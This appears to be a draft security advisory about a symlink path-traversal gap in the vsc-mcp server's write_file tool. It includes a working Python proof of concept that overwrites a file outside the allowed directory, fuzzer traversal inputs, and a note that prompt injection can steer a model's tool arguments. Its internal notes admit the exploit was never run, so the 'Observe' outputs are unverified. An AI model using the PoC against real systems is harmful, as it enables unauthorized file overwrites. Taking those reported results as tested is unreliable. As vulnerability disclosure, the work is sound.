# Path check in `write_file` does not resolve symlinks: writes can land outside `ALLOWED_DIRECTORIES`

**Repository:** `thomasgazzoni/vsc-mcp` · **Tool:** `write_file` · **Tested commit:** `535ef45`
**Weakness:** CWE-22 Path Traversal

## Summary
`write_file` creates or overwrites a file and is meant to stay inside `ALLOWED_DIRECTORIES` (or the working directory when that is unset). The check in `isPathAllowed` is purely lexical: it runs `path.resolve` / `path.normalize` and compares string prefixes. That correctly stops `../` sequences, but it does not resolve symbolic links. If any directory or file inside the allowed root is a symlink to somewhere else, `write_file` follows it and writes outside the root. The same helper guards `read_file`, `search_replace_file` and `find_references`.

## Details
`src/tools/write-file.ts:41-79`:

```ts
const absolutePath = path.resolve(filePath);
const pathCheck = isPathAllowed(absolutePath);
if (!pathCheck.allowed) { ... }
...
fs.writeFileSync(absolutePath, newContent, "utf-8");
```

`src/utils/file-utils.ts:55-65`:

```ts
const normalizedFilePath = path.normalize(filePath);
const normalizedDirectory = path.normalize(directory);
if (normalizedFilePath === normalizedDirectory ||
    normalizedFilePath.startsWith(normalizedDirectory + path.sep)) {
  return { allowed: true };
}
```

Neither the target nor the allowed directory goes through `fs.realpath`, and `fs.writeFileSync` follows symlinks in every path component. Side note: when `ALLOWED_DIRECTORIES` is set, `/home/workspace/project` is always appended to the list (`file-utils.ts:24-25`), even outside Docker.

## Steps to reproduce
1. Prerequisites: Bun (per the README) and Python with the `mcp` package. Create a project, a marker file outside it, and a symlink inside the project that points to the marker's directory:
   ```bash
   mkdir -p /tmp/tofu-poc/project /tmp/tofu-poc/logs
   echo marker > /tmp/tofu-poc/outside.txt
   ln -s /tmp/tofu-poc /tmp/tofu-poc/project/link
   ```
2. Install as the README describes: clone the repo, `bun install`, then start `bun <clone>/src/index.ts` with `ALLOWED_DIRECTORIES=/tmp/tofu-poc/project` and `LOG_DIR=/tmp/tofu-poc/logs`. `write_file` does not need the Docker LSP mode.
3. First confirm that `../` is blocked, then write through the symlink:

   ```python
   import asyncio, os
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   CLONE = "/path/to/vsc-mcp"  # your checkout

   async def main():
       server = StdioServerParameters(
           command="bun",
           args=[f"{CLONE}/src/index.ts"],
           env={**os.environ,
                "ALLOWED_DIRECTORIES": "/tmp/tofu-poc/project",
                "LOG_DIR": "/tmp/tofu-poc/logs"},
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               print(await session.call_tool("write_file", {
                   "filePath": "/tmp/tofu-poc/project/../outside.txt",
                   "newContent": "should be denied\n"}))
               print(await session.call_tool("write_file", {
                   "filePath": "/tmp/tofu-poc/project/link/outside.txt",
                   "newContent": "overwritten through symlink\n"}))

   asyncio.run(main())
   ```
4. Observe: the first call returns `Access denied: ...`. The second returns `{"success":true,"filePath":"/tmp/tofu-poc/project/link/outside.txt",...,"action":"overwritten"}`, and `cat /tmp/tofu-poc/outside.txt` now prints `overwritten through symlink` instead of `marker`.

## Expected behavior
A write whose real target is outside `ALLOWED_DIRECTORIES` is denied, whether the path leaves the root through `../` or through a symlink.

## Actual behavior
`../` is denied, but the symlinked path passes the lexical check and the file outside the root is overwritten.

## Impact
Tool arguments are chosen by the model and can be steered by prompt injection, for example from comments in the code it is editing. Exploiting this also needs a symlink inside the allowed directory that points outside it. Repositories can commit symlinks, and some tools create them inside projects, so a malicious or unusual repository can provide one. With both conditions met, an attacker can overwrite files outside the configured project with chosen content, with the server user's privileges. Without such a symlink, the existing check holds.

## Suggested fix
- Resolve real paths before comparing: `fs.realpathSync` each allowed directory once at startup, and for the target use `fs.realpathSync` on the nearest existing ancestor, then append the remaining components. Compare with `path.relative` (reject if it starts with `..` or is absolute).
- Open the final file with `O_NOFOLLOW` (for example `fs.openSync(p, fs.constants.O_WRONLY | fs.constants.O_CREAT | fs.constants.O_TRUNC | fs.constants.O_NOFOLLOW)`) so a symlink swapped in after the check is not followed.
- Only add `/home/workspace/project` to the allowed list when actually running in the Docker setup.

## Status on the default branch
Still present at `535ef45` (2025-05-06). The default branch has no commits after the tested one.

## Prior reports
- Issues and pull requests: none related. The repository has 2 issues and 0 pull requests (fetched 2026-10-01), both feature requests (other LSP languages, working without repomix).
- Documentation: `README.md`, "Security Features" / "Path Restriction": "Attempting to access files outside allowed directories will result in an \"Access denied\" error." This is the guarantee the symlink path breaks. The README does not mention symlinks.

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal; `check_path_traversal`.
- Campaigns and executions: recover-pc 3584 exec / 1138 success.
- Evidence (verbatim, trimmed):
  - `{'filePath': '..\\..\\..\\..\\windows\\win.ini', 'newContent': 'test content'}` -> `{"success":true,"filePath":"/scratch/tofu/eval/targets/thomasgazzoni__vsc-mcp/..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini","fileSize":12,"action":"overwritten"}`
  - `{'filePath': '"filePath": "/etc/passwd\\u000\x19", "newContent": "test content', 'newContent': ''}` -> written as a relative file name inside the target dir.
  - `{'filePath': '..\\..\\..\\..\\windows\\wnii.ni', 'newContent': 'test content'}` -> same, inside the target dir.
- Hand-check hints: weak, and ToFu's alert itself is a false positive. Every logged write landed inside the allowed root (the server's working directory, since `ALLOWED_DIRECTORIES` was unset): backslashes are literal on Linux, and the quoted string is just an odd relative filename. The `../` check in `isPathAllowed` works. The symlink bypass in this draft is a different, real gap that I found by reading `file-utils.ts`; it is derived from code and Node's documented symlink-following, not from a log, and was not run. It needs a pre-existing symlink in the root, so severity is moderate at most. Consider whether to file it at all, and if so say plainly that it came from code review after a fuzzer hint.
</details>
